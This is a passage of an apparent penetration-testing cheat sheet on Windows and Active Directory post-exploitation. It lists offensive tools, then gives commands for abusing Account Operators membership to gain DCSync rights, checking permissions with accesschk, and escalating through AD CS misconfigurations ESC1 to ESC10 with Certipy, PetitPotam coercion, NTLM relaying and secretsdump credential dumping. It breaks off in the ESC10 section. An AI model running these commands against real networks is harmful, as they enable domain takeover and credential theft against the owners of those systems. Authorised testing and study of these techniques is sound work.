# Post Exploitation

- [Resources](#resources)

## Table of Contents

- [Abusing Account Operators Group Membership](#abusing-account-operators-group-membership)
- [accesschk](#accesschk)
- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
- [ADMiner](#adminer)
- [Apache2](#apache2)
- [AppLocker](#applocker)
- [APT](#apt)
- [arua2c](#arua2c)
- [Bash](#bash)
- [Bash Debugging Mode](#bash-debugging-mode)
- [BloodHound](#bloodhound)
- [BloodHound Python](#bloodhound-python)
- [bloodyAD](#bloodyad)
- [Certify](#certify)
- [Certipy](#certipy)
- [ClamAV](#clamav)
- [Coercer](#coercer)
- [Credentials File](#credentials-file)
- [dd](#dd)
- [DNS](#dns)
- [Data Protection API (DPAPI)](#data-protection-api-dpapi)
- [enum4linux](#enum4linux)
- [enum4linux-ng](#enum4linux-ng)
- [env](#env)
- [Evil-WinRM](#evil-winrm)
- [Excel](#excel)
- [find](#find)
- [FullPowers](#fullpowers)
- [functions](#functions)
- [gdbus](#gdbus)
- [gem](#gem)
- [Git](#git)
- [gMSADumper](#gmsadumper)
- [grep](#grep)
- [gsocket](#gsocket)
- [find](#find)
- [functions](#functions)
- [Impacket](#impacket)
- [Internet Information Service (IIS)](#internet-information-service-iis)
- [JAWS](#jaws)
- [Kerberos](#kerberos)
- [Kiosk Breakout](#kiosk-breakout)
- [Krbrelayx](#krbrelayx)
- [LAPS](#laps)
- [LDAP](#ldap)
- [ldapmodify](#ldapmodify)
- [ldapsearch](#ldapsearch)
- [LD_PRELOAD](#ld_preload)
- [LD_LIBRARY_PATH](#ld_library_path)
- [Libre Office](#libre-office)
- [Linux](#linux)
- [Linux Wildcards](#linux-wildcards)
- [logrotten](#logrotten)
- [Lsass](#lsass)
- [Lua](#lua)
- [machinectl](#machinectl)
- [Microsoft Windows](#microsoft-windows)
- [Microsoft Windows Defender](#microsoft-windows-defender)
- [Minimalistic Offensive Security Tools](#minimalistic-offensive-security-tools)
- [nginx](#nginx)
- [PassTheCert](#passthecert)
- [Path Variable Hijacking](#path-variable-hijacking)
- [Perl](#perl)
- [PHP7.2](#php72)
- [pika](#pika)
- [Ping Sweep](#ping-sweep)
- [PKINITtools](#pkinittools)
- [plotting](#plotting)
- [Port Scanning](#port-scanning)
- [PoshADCS](#poshadcs)
- [powercat](#powercat)
- [Powermad](#powermad)
- [PowerShell](#powershell)
- [PowerShell Constrained Language Mode (CLM)](#powershell-constrained-language-mode-clm)
- [PowerSploit](#powersploit)
- [PowerView](#powerview)
- [Pre-created Computer Accounts](#pre-created-computer-accounts)
- [PRET](#pret)
- [procdump](#procdump)
- [PsExec](#psexec)
- [pspy](#pspy)
- [pth-toolkit](#pth-toolkit)
- [pwncat](#pwncat)
- [pyGPOAbuse](#pygpoabuse)
- [Python](#python)
- [rbash](#rbash)
- [relayd](#relayd)
- [rpcclient](#rpcclient)
- [Rubeus](#rubeus)
- [RunasCs](#runascs)
- [SeBackupPrivilege Privilege Escalation (diskshadow)](#sebackupprivilege-privilege-escalation-diskshadow)
- [setcap](#setcap)
- [Shared Library Misconfiguration](#shared-library-misconfiguration)
- [SharpDPAPI](#sharpdpapi)
- [SharpHound](#sharphound)
- [Shell Upgrade](#shell-upgrade)
- [Sherlock](#sherlock)
- [smbpasswd](#smbpasswd)
- [systemctl](#systemctl)
- [Time Stomping](#time-stomping)
- [Universal Privilege Escalation and Persistence Printer](#universal-privilege-escalation-and-persistence-printer)
- [User Account Control (UAC) Bypass](#user-account-control-uac-bypass)
- [User Group Exploitation](#user-group-exploitation)
- [VSS](#vss)
- [WDigest](#wdigest)
- [Whisker](#whisker)
- [Windows-Exploit-Suggester](#windows-exploit-suggester)
- [winexe](#winexe)
- [World Writeable Directories](#world-writeable-directories)
- [writeDACL](#writedacl)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| ADCSKiller | An ADCS Exploitation Automation Tool Weaponizing Certipy and Coercer | https://github.com/grimlockx/ADCSKiller |
| ADCSTemplate | A PowerShell module for exporting, importing, removing, permissioning, publishing Active Directory Certificate Templates. It also includes a DSC resource for creating AD CS templates using these functions. This was built with the intent of using DSC for rapid lab builds. Could also work in production to move templates between AD CS environments. | https://github.com/GoateePFE/ADCSTemplate |
| ADMiner | AD Miner is an Active Directory audit tool that leverages cypher queries to crunch data from the #Bloodhound graph database to uncover security weaknesses | https://github.com/Mazars-Tech/AD_Miner |
| adPEAS | Powershell tool to automate Active Directory enumeration. | https://github.com/61106960/adPEAS |
| BloodHound | BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. | https://github.com/BloodHoundAD/BloodHound |
| BloodHound | Fork of BloodHound with PKI nodes and edges for Certipy along with some minor personal improvements | https://github.com/ly4k/BloodHound |
| BloodHound Docker | BloodHound Docker Ready to Use | https://github.com/belane/docker-bloodhound |
| BloodHound Python | A Python based ingestor for BloodHound | https://github.com/dirkjanm/BloodHound.py |
| BloodyAD Framework | BloodyAD is an Active Directory Privilege Escalation Framework, it can be used manually using bloodyAD.py or automatically by combining pathgen.py and autobloody.py. | https://github.com/CravateRouge/bloodyAD |
| Certify | Active Directory certificate abuse. | https://github.com/GhostPack/Certify |
| Certipy | Tool for Active Directory Certificate Services enumeration and abuse | https://github.com/ly4k/Certipy |
| check_vulnerabledrivers.ps1 | A quick script to check for vulnerable drivers. Compares drivers on system with list from loldrivers.io | https://gist.github.com/api0cradle/d52832e36aaf86d443b3b9f58d20c01d |
| Coercer | A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through 9 methods. | https://github.com/p0dalirius/Coercer |
| CSExec | An implementation of PSExec in C# | https://github.com/malcomvetter/CSExec |
| DLLSideloader | PowerShell script to generate "proxy" counterparts to easily perform DLL Sideloading | https://github.com/Flangvik/DLLSideloader |
| dnsteal | This is a fake DNS server that allows you to stealthily extract files from a victim machine through DNS requests. | https://github.com/m57/dnsteal |
| enum4linux | A Linux alternative to enum.exe for enumerating data from Windows and Samba hosts. | https://github.com/CiscoCXSecurity/enum4linux |
| enum4linux-ng | A next generation version of enum4linux. | https://github.com/cddmp/enum4linux-ng |
| EvilTree | A python3 remake of the classic "tree" command with the additional feature of searching for user provided keywords/regex in files, highlighting those that contain matches. | https://github.com/t3l3machus/eviltree |
| FindUncommonShares | FindUncommonShares is a Python script allowing to quickly find uncommon shares in vast Windows Domains, and filter by READ or WRITE accesses.. | https://github.com/p0dalirius/FindUncommonShares |
| FullPowers | Recover the default privilege set of a LOCAL/NETWORK SERVICE account | https://github.com/itm4n/FullPowers |
| GhostPack-Compiled Binaries | Compiled Binaries for Ghostpack (.NET v4.0) | https://github.com/r3motecontrol/Ghostpack-CompiledBinaries |
| GTFOBins | GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. | https://gtfobins.github.io/ |
| HEKATOMB | Hekatomb is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers and uses Domain backup keys to decrypt them. | https://github.com/Processus-Thief/HEKATOMB |
| Impacket | Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. | https://github.com/fortra/impacket |
| Impacket Static Binaries | Standalone binaries for Linux/Windows of Impacket's examples | https://github.com/ropnop/impacket_static_binaries |
| JAWS | JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. | https://github.com/411Hall/JAWS |
| KrbRelay | Framework for Kerberos relaying | https://github.com/cube0x0/KrbRelay |
| KrbRelayUp | KrbRelayUp - a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings). | https://github.com/Dec0ne/KrbRelayUp |
| Krbrelayx | Kerberos unconstrained delegation abuse toolkit | https://github.com/dirkjanm/krbrelayx |
| LAPSDumper | Dumping LAPS from Python | https://github.com/n00py/LAPSDumper |
| LES: Linux privilege escalation auditing tool | Linux privilege escalation auditing tool | https://github.com/The-Z-Labs/linux-exploit-suggester |
| LinEnum | Privilege Escalation Enumeration | https://github.com/rebootuser/LinEnum |
| linWinPwn | linWinPwn is a bash script that automates a number of Active Directory Enumeration and Vulnerability checks | https://github.com/lefayjey/linWinPwn |
| LoFP | Living off the False Positive! | https://br0k3nlab.com/LoFP |
| LOLAPPS | LOLAPPS is a compendium of applications that can be used to carry out day-to-day exploitation. | https://lolapps-project.github.io/# |
| LOLBAS | The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. | https://lolbas-project.github.io/# |
| LOLBins CTI-Driven | The LOLBins CTI-Driven (Living-Off-the-Land Binaries Cyber Threat Intelligence Driven) is a project that aims to help cyber defenders understand how LOLBin binaries are used by threat actors during an intrusion in a graphical and digestible format for the TIPs platform using the STIX format. | https://lolbins-ctidriven.vercel.app |
| LOLDrivers | Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats. | https://www.loldrivers.io |
| LOFLCAB | Living off the Foreign Land Cmdlets and Binaries | https://lofl-project.github.io |
| LOOBins | Living Off the Orchard: macOS Binaries (LOOBins) is designed to provide detailed information on various built-in macOS binaries and how they can be used by threat actors for malicious purposes. | https://www.loobins.io |
| lsassy | Python tool to remotely extract credentials on a set of hosts. | https://github.com/Hackndo/lsassy |
| nanodump | LSASS dumper | https://github.com/helpsystems/nanodump |
| NTLMRelay2Self | An other No-Fix LPE, NTLMRelay2Self over HTTP (Webdav). | https://github.com/med0x2e/NTLMRelay2Self |
| Obfuscated SharpCollection | Attempt at Obfuscated version of SharpCollection | https://github.com/Flangvik/ObfuscatedSharpCollection |
| Outgoing Port Tester | This server listens on all TCP ports, allowing you to test any outbound TCP port. | http://portquiz.net |
| PassTheCert | Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannel | https://github.com/AlmondOffSec/PassTheCert |
| PEASS-ng | Privilege Escalation Awesome Scripts SUITE new generation | https://github.com/carlospolop/PEASS-ng |
| Ping Castle | Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. | https://github.com/vletoux/pingcastle |
| PKINITtools | Tools for Kerberos PKINIT and relaying to AD CS | https://github.com/dirkjanm/PKINITtools |
| powercat | Netcat: The powershell version. | https://github.com/besimorhino/powercat |
| Powermad | PowerShell MachineAccountQuota and DNS exploit tools | https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1 |
| PowerSharpPack | Many useful offensive CSharp Projects wraped into Powershell for easy usage. | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
| PowershellKerberos | Some scripts to abuse kerberos using Powershell | https://github.com/MzHmO/PowershellKerberos |
| PowerShell-Suite | My musings with PowerShell | https://github.com/FuzzySecurity/PowerShell-Suite |
| PowerSploit | PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. | https://github.com/PowerShellMafia/PowerSploit |
| PowerUp | PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
| PowerView | PowerView is a PowerShell tool to gain network situational awareness on Windows domains. | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| PowerView.py | PowerView alternative | https://github.com/aniqfakhrul/powerview.py |
| PPLdump | Dump the memory of a PPL with a userland exploit | https://github.com/itm4n/PPLdump |
| Pre2k | Pre2k is a tool to query for the existence of pre-windows 2000 computer objects which can be leveraged to gain a foothold in a target domain as discovered by TrustedSec's @Oddvarmoe. | https://github.com/garrettfoster13/pre2k |
| Priv2Admin | Exploitation paths allowing you to (mis)use the Windows Privileges to elevate your rights within the OS. | https://github.com/gtworek/Priv2Admin |
| PSPKIAudit | PowerShell toolkit for AD CS auditing based on the PSPKI toolkit. | https://github.com/GhostPack/PSPKIAudit |
| pspy | pspy is a command line tool designed to snoop on processes without need for root permissions. | https://github.com/DominicBreuker/pspy |
| pth-toolkit | A modified version of the passing-the-hash tool collection https://code.google.com/p/passing-the-hash/ designed to be portable and work straight out of the box even on the most 'bare bones' systems. | https://github.com/byt3bl33d3r/pth-toolkit |
| pwncat | Post-Exploitation Platform | https://github.com/calebstewart/pwncat |
| pyGPOAbuse | Partial python implementation of SharpGPOAbuse | https://github.com/Hackndo/pyGPOAbuse |
| PyWhisker | Python version of the C# tool for "Shadow Credentials" attacks | https://github.com/ShutdownRepo/pywhisker |
| Rubeus | Rubeus is a C# toolset for raw Kerberos interaction and abuses. | https://github.com/GhostPack/Rubeus |
| RunasCs | RunasCs - Csharp and open version of windows builtin runas.exe | https://github.com/antonioCoco/RunasCs |
| rustcat | Rustcat(rcat) - The modern Port listener and Reverse shell | https://github.com/robiot/rustcat |
| RustHound | Active Directory data collector for BloodHound written in rust. | https://github.com/OPENCYBER-FR/RustHound |
| scavenger | scavenger is a multi-threaded post-exploitation scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information. | https://github.com/SpiderLabs/scavenger |
| SCShell | Fileless lateral movement tool that relies on ChangeServiceConfigA to run command | https://github.com/Mr-Un1k0d3r/SCShell |
| Seatbelt | Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. | https://github.com/GhostPack/Seatbelt |
| SeBackupPrivilege | Use SE_BACKUP_NAME/SeBackupPrivilege to access objects you shouldn't have access to. | https://github.com/giuliano108/SeBackupPrivilege |
| SharpADWS | Active Directory reconnaissance and exploitation for Red Teams via the Active Directory Web Services (ADWS). | https://github.com/wh0amitz/SharpADWS |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| SharpCollection | Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines. | https://github.com/Flangvik/SharpCollection |
| SharpDPAPI | SharpDPAPI is a C# port of some Mimikatz DPAPI functionality. | https://github.com/GhostPack/SharpDPAPI |
| SharpEventPersist | Persistence by writing/reading shellcode from Event Log | https://github.com/improsec/SharpEventPersist |
| SharpExfiltrate | Modular C# framework to exfiltrate loot over secure and trusted channels. | https://github.com/Flangvik/SharpExfiltrate |
| SharpHound | C# Data Collector for BloodHound | https://github.com/BloodHoundAD/SharpHound |
| SharPyShell | SharPyShell - tiny and obfuscated ASP.NET webshell for C# web applications | https://github.com/antonioCoco/SharPyShell |
| SharpStay | .NET project for installing Persistence | https://github.com/0xthirteen/SharpStay |
| Sharp-Suite | Also known by Microsoft as Knifecoat hot_pepper | https://github.com/FuzzySecurity/Sharp-Suite |
| SharpView | C# implementation of harmj0y's PowerView | https://github.com/tevora-threat/SharpView |
| Sherlock | PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities. | https://github.com/rasta-mouse/Sherlock |
| SilentHound | Quietly enumerate an Active Directory Domain via LDAP parsing users, admins, groups, etc. | https://github.com/layer8secure/SilentHound |
| SMBeagle | SMBeagle - Fileshare auditing tool. | https://github.com/punk-security/smbeagle |
| static-binaries | This repo contains a bunch of statically-linked binaries of various tools, along with the Dockerfiles / other build scripts that can be used to build them. | https://github.com/andrew-d/static-binaries |
| SUDO_KILLER | A tool to identify and exploit sudo rules' misconfigurations and vulnerabilities within sudo for linux privilege escalation. | https://github.com/TH3xACE/SUDO_KILLER |
| tickey | Tool to extract Kerberos tickets from Linux kernel keys. | https://github.com/TarlogicSecurity/tickey |
| WADComs | WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments. | https://wadcoms.github.io |
| Watson | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. | https://github.com/rasta-mouse/Watson |
| WESNG | WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. | https://github.com/bitsadmin/wesng
| Whisker | Whisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account. | https://github.com/eladshamir/Whisker |
| Windows-privesc-check | Tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps (e.g. databases). | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation Fundamentals | How-to Windows Privilege Escalation | https://www.fuzzysecurity.com/tutorials/16.html |
| Windows Privilege Escalation | Windows privlege escalation methodology | https://github.com/frizb/Windows-Privilege-Escalation |
| WinPwn | Automation for internal Windows Penetrationtest / AD-Security | https://github.com/S3cur3Th1sSh1t/WinPwn |
| wmiexec-Pro | New generation of wmiexec.py | https://github.com/XiaoliChan/wmiexec-Pro |
| WorldWritableDirs.txt | World-writable directories in %windir% | https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56 |

## Abusing Account Operators Group Membership

### Add User

```c
PS C:\> net user <USERNAME> <PASSWORD> /add /domain
PS C:\> net group "Exchange Windows Permissions" /add <USERNAME>
```

### Import PowerView

```c
PS C:\> powershell -ep bypass
PS C:\> . .\PowerView.ps1
```

### Add DCSync Rights

```c
PS C:\> $pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
PS C:\> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=local" -PrincipalIdentity <USERNAME> -Rights DCSync
```

### DCSync

```c
$ impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
```

## accesschk

### Checking File Permissions

```c
C:\> .\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```

### Checking Service Permissions

```c
C:\> .\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```

### Checking Path Permissions to find Unquoted Service Paths

```c
C:\> .\accesschk.exe /accepteula -uwdq C:\
C:\> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
C:\> .\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```

### Checking Registry Entries

```c
C:\> .\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

## Active Directory Certificate Services (AD CS)

> https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=d78c66b6ad78

> https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf

> https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7

> https://github.com/ly4k/Certipy

> https://watchdogsacademy.gitbook.io/attacking-active-directory/active-directory-certificate-services-adcs

### Find Vulnerabilities in Active Directory Certificate Services (AD CS)

```c
$ certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -dc-ip <RHOST> -vulnerable -stdout
```

### Domain Escalation

- [ESC1: Misconfigured Certificate Templates](#ESC1-Misconfigured-Certificate-Templates)
- [ESC2: Misconfigured Certificate Templates](#ESC2-Misconfigured-Certificate-Templates)
- [ESC3: Enrollment Agent Templates](#ESC3-Enrollment-Agent-Templates)
- [ESC4: Vulnerable Certificate Template Access Control](#ESC4-Vulnerable-Certificate-Template-Access-Control)
- [ESC5: Vulnerable PKI Object Access Control](#ESC5-Vulnerable-PKI-Object-Access-Control)
- [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2](#ESC6-EDITF_ATTRIBUTESUBJECTALTNAME2)
- [ESC7: Vulnerable Certificate Authority Access Control](#ESC7-Vulnerable-Certificate-Authority-Access-Control)
- [ESC8: NTLM Relay to AD CS HTTP Endpoints](#ESC8-NTLM-Relay-to-AD-CS-HTTP-Endpoints)
- [ESC9: No Security Extensions](#ESC9-No-Security-Extensions)
- [ESC10: Weak Certificate Mappings](#ESC10-Weak-Certificate-Mappings)
- [ESC11: IF_ENFORCEENCRYPTICERTREQUEST](#ESC11-IF_ENFORCEENCRYPTICERTREQUEST)

### ESC1: Misconfigured Certificate Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights.
- Manager approval is disabled.
	- mspki-enrollment-flag attribute needs to be set to 0x00000000
- No authorized signatures are required.
	- msPKI-RA-Signature attribute needs to be set to 0x00000000
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- The certificate template defines EKUs that enable authentication.
	- mspki-certificate-application-policy attribute needs to contain at least one of the following: Client Authentication (1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) or no EKU (SubCA).
- The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR.
	- msPKI-Certificate-Name-Flag attribute needs to be set to 0x00000001.

#### Usage

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN> -dns <RHOST>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC2: Misconfigured Certificate Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights.
- Manager approval is disabled.
	- mspki-enrollment-flag attribute needs to be set to 0x00000000
- No authorized signatures are required.
	- msPKI-RA-Signature attribute needs to be set to 0x00000000
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- The certificate template defines Any Purpose EKUs or no EKU.

#### Usage

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC3: Enrollment Agent Templates

#### Prerequisistes

- The Enterprise CA grants low-privileged users enrollment rights.
- Manager approval is disabled.
	- mspki-enrollment-flag attribute needs to be set to 0x00000000
- No authorized signatures are required.
	- msPKI-RA-Signature attribute needs to be set to 0x00000000
- An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
- The certificate template defines the Certificate Request Agent EKU.
	- The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificate templates on behalf of other principals.
- Enrollment agent restrictions are not implemented on the CA.

#### Usage

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC4: Vulnerable Certificate Template Access Control

#### Description

`ESC4` is when a user has `write privileges` over a `certificate template`. This can for instance be abused to `overwrite` the `configuration` of the `certificate template` to make the template vulnerable to `ESC1`.

By default, Certipy will overwrite the configuration to make it vulnerable to `ESC1`.

We can specify the `-save-old` parameter to save the old configuration, which is useful for restoring the configuration afterwards.

#### Usage

```c
$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
```

The certificate template is now vulnerable to the `ESC1` technique.

Therefore, we can now request a certificate based on the `ESC4` template and specify an `arbitrary SAN` with the `-upn` or `-dns` parameter.

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template <TEMPLATE> -upn administrator@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

##### Restore Configuration

```c
$ certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLATE> -configuration <TEMPLATE>.json
```

### ESC5: Vulnerable PKI Object Access Control

#### Description

A number of objects `outside` of `certificate templates` and the `certificate authority` itself can have a `security impact` on the entire `AD CS` system.

These possibilities include (but are not limited to):

- CA server’s AD computer object (i.e., compromise through RBCD)
- The CA server’s RPC/DCOM server
- Any descendant AD object or container in the container CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM> (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services container, etc.)

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

#### Description

`ESC6` is when the `CA` specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This flag allows the `enrollee` to specify an `arbitrary SAN` on `all certificates` despite a certificate template's configuration.

After the `patch` for the reported vulnerability `CVE-2022–26923`, this technique `no longer works alone`, but must be combined with `ESC10`.

The attack is the same as `ESC1`, except that you can `choose` any `certificate template` that permits `client authentication`. After the `May 2022` security updates, `new certificates` will have a securiy extension that `embeds` the requester's `objectSid` property. For `ESC1`, this property will be `reflected` from the `SAN` specified, but with `ESC6`, this property reflects the requester's `objectSid`, and not from the SAN. Notice that the `objectSid` changes `depending` on the requester.

As such, to abuse `ESC6`, the `environment` must be `vulnerable` to `ESC10 (Weak Certificate Mappings)`, where the `SAN` is preferred `over` the `new security extension`.

#### Usage

```c
$ certipy find -username <USERNAME>@<DOMAIN> -password <PASSWORD> -vulnerable -dc-ip <RHOST> -stdout
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
```

```c
$ certipy req -ca '<CA>' -username administrator@<DOMAIN> -password <PASSWORD> -target <CA> -template User -upn administrator@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC7: Vulnerable Certificate Authority Access Control

#### Description

`ESC7` is when a user has the `Manage CA` or `Manage Certificates` access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.

The `Certified Pre-Owned whitepaper` mentions that this access right can be used to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to perform the `ESC6` attack, but this will `not have` any effect `until` the `CA service (CertSvc)` is `restarted`.

#### Alternative Technique by ly4k without restarting the CA service (CertSvc) service

##### Prerequisistes

- User must have the Manage Certificates access rights
- The certificate template SubCA must be enabled.

The technique relies on the fact that users with the `Manage CA` and `Manage Certificates` access right can `issue failed certificate requests`. The `SubCA` certificate `template` is `vulnerable` to `ESC1`, but only administrators can enroll in the template. Thus, a `user` can request to `enroll` in the `SubCA` - `which will be denied` - but then issued by the manager afterwards.

If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

##### Usage

```c
$ certipy ca -ca '<CA>' -add-officer <USERNAME> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
```

```c
$ certipy ca -ca '<CA>' -enable-template SubCA -username <USERNAME>@<DOMAIN> -password <PASSWORD>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -template SubCA -upn administrator@<DOMAIN>
```

```c
$ certipy ca -ca '<CA>' -issue-request <ID> -username <USERNAME>@<DOMAIN> -password <PASSWORD>
```

```c
$ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -target <CA> -retrieve <ID>
```

```c
$ certipy auth -pfx administrator.pfx -dc-ip <RHOST>
```

### ESC8: NTLM Relay to AD CS HTTP Endpoints

#### Prerequisistes

- Enrollment Service has installed and enabled Web Enrollment via HTTP.

#### Usage

```c
$ certipy relay -target 'http://<CA>'
$ certipy relay -ca '<CA>' -template <TEMPLATE>
```

```c
$ python3 PetitPotam.py <RHOST> <DOMAIN>
```

```c
$ certipy auth -pfx dc.pfx -dc-ip <RHOST>
```

```c
$ export KRB5CCNAME=dc.ccache
```

```c
$ sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

##### Coercing

```c
$ sudo ntlmrelayx.py -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
```

```c
$ python3 PetitPotam.py <RHOST> <DOMAIN>
```

```c
$ python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'dc$' 'dc.ccache'
```

```c
$ export KRB5CCNAME=dc.ccache
```

```c
$ sudo secretsdump.py -k -no-pass <DOMAIN>/'dc$'@<DOMAIN>
```

### ESC9: No Security Extensions

#### Prerequisites

- StrongCertificateBindingEnforcement set to 1 (default) or 0
	- StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag
- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
- Certificate specifies any client authentication EKU
- GenericWrite over any account A to compromise any account B

#### Usage

```c
$ certipy shadow auto -username <USERNAME>@<DOMAIN> -password <PASSWORD> -account <USERNAME>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn Administrator
```

```c
$ certipy req -ca '<CA>' -username <USERNAME> -hashes 54296a48cd30259cc88095373cec24da -template <TEMPLATE>
```

```c
$ certipy account update -username <USERNAME>@<DOMAIN> -password <PASSWORD> -user <USERNAME> -upn <USERNAME>@<DOMAIN>
```

```c
$ certipy auth -pfx administrator.pfx -domain <DOMAIN>
```

### ESC10: Weak Certificate Mappings

#### Prerequisistes

- Case 1 : `StrongCertificateBindingEnforcement` set to `0`
	- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc StrongCertificateBindingEnforcement. Default value 1, previously 0.
	- GenericWrite over any account A to compromise any account B

- Case 2 : `CertificateMappingMethods` contains `UPN` bit `(0x4)`
	- HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel CertificateMappingMethods. Default value 0x18 (0x8 | 0x10), previously 0x1F.	
